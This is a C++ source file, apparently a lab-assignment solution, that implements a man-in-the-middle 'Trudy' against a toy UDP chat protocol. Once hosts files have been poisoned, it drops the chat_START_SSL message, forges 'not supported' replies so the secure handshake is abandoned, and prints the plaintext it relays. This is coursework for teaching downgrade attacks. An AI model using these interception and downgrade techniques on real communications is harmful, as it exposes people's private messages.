// secure_chat_interceptor.cpp
// Task 3 — chat_START_SSL downgrade attack, run from Trudy.
//
//   ./secure_chat_interceptor -d <alice_host> <bob_host>
//
// Pre-condition: Trudy has poisoned the /etc/hosts of Alice and Bob so that
// each resolves the other's hostname to Trudy's address
// (bash ~/poison-dns-alice1-bob1.sh). Every datagram then lands on Trudy
// first. Trudy is a transparent relay for all traffic EXCEPT the
// chat_START_SSL control message:
//
//   * chat_START_SSL is dropped (never reaches the real peer).
//   * A forged chat_START_SSL_NOT_SUPPORTED is returned to the sender and
//     also pushed to the other party, so Alice and Bob both give up on the
//     secure handshake and continue in plaintext.
//   * From then on Trudy relays — and prints — every plaintext chat message.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <iostream>
#include <string>

using namespace std;

#define BUF_SIZE  1024
#define CHAT_PORT 8080

// Resolve a hostname to an IPv4 address (Trudy's own /etc/hosts is clean, so
// alice_host / bob_host still map to the real containers).
static in_addr_t resolveHost(const char* name) {
    struct hostent* h = gethostbyname(name);
    if (!h) {
        herror("gethostbyname");
        exit(EXIT_FAILURE);
    }
    return ((struct in_addr*)h->h_addr_list[0])->s_addr;
}

static sockaddr_in makeEndpoint(in_addr_t ip) {
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family      = AF_INET;
    a.sin_addr.s_addr = ip;
    a.sin_port        = htons(CHAT_PORT);
    return a;
}

int main(int argc, char** argv) {
    setvbuf(stdout, NULL, _IOLBF, 0);   // line-buffered so `| tee attack.log` works

    if (argc != 4 || strcmp(argv[1], "-d") != 0) {
        fprintf(stderr, "Usage: %s -d <alice_host> <bob_host>\n", argv[0]);
        return 1;
    }

    in_addr_t alice_ip = resolveHost(argv[2]);
    in_addr_t bob_ip   = resolveHost(argv[3]);

    struct in_addr tmp;
    tmp.s_addr = alice_ip; string alice_str = inet_ntoa(tmp);
    tmp.s_addr = bob_ip;   string bob_str   = inet_ntoa(tmp);
    printf("[trudy] downgrade attack armed — Alice=%s  Bob=%s  port=%d\n",
           alice_str.c_str(), bob_str.c_str(), CHAT_PORT);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    // Bind every interface. SC_BIND_ADDR is a test-only override so Trudy can
    // share one host with Alice/Bob on 127.0.0.x.
    const char* bindEnv = getenv("SC_BIND_ADDR");
    struct sockaddr_in bind_addr =
        makeEndpoint(bindEnv ? inet_addr(bindEnv) : htonl(INADDR_ANY));
    if (bind(sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr)) != 0) {
        perror("bind");
        return 1;
    }

    struct sockaddr_in to_bob   = makeEndpoint(bob_ip);
    struct sockaddr_in to_alice = makeEndpoint(alice_ip);  // port fixed up below
    bool   know_alice = false;                              // learned from her 1st packet
    bool   downgraded = false;

    while (true) {
        char buf[BUF_SIZE];
        struct sockaddr_in from;
        socklen_t from_len = sizeof(from);
        int n = recvfrom(sock, buf, BUF_SIZE - 1, 0,
                         (struct sockaddr*)&from, &from_len);
        if (n <= 0)
            continue;
        buf[n] = '\0';

        bool from_alice = (from.sin_addr.s_addr == alice_ip);
        bool from_bob   = (from.sin_addr.s_addr == bob_ip);
        if (!from_alice && !from_bob)
            continue;                       // stray traffic — ignore

        if (from_alice) {
            to_alice.sin_port = from.sin_port;   // remember Alice's ephemeral port
            know_alice = true;
        }

        // ── The one message Trudy tampers with ─────────────────────────────
        if (strcmp(buf, "chat_START_SSL") == 0) {
            const char* forged = "chat_START_SSL_NOT_SUPPORTED";
            printf("[trudy] blocked chat_START_SSL from %s — injecting %s\n",
                   from_alice ? "Alice" : "Bob", forged);
            if (know_alice)
                sendto(sock, forged, strlen(forged), 0,
                       (struct sockaddr*)&to_alice, sizeof(to_alice));
            sendto(sock, forged, strlen(forged), 0,
                   (struct sockaddr*)&to_bob, sizeof(to_bob));
            downgraded = true;
            continue;                       // never forwarded to the real peer
        }

        // ── Everything else: relay unchanged, and read it once downgraded ──
        if (from_alice) {
            sendto(sock, buf, n, 0, (struct sockaddr*)&to_bob, sizeof(to_bob));
            if (downgraded)
                printf("[trudy] Alice -> Bob : %s\n", buf);
        } else if (know_alice) {            // from Bob
            sendto(sock, buf, n, 0, (struct sockaddr*)&to_alice, sizeof(to_alice));
            if (downgraded)
                printf("[trudy] Bob -> Alice : %s\n", buf);
        }
    }
    return 0;
}
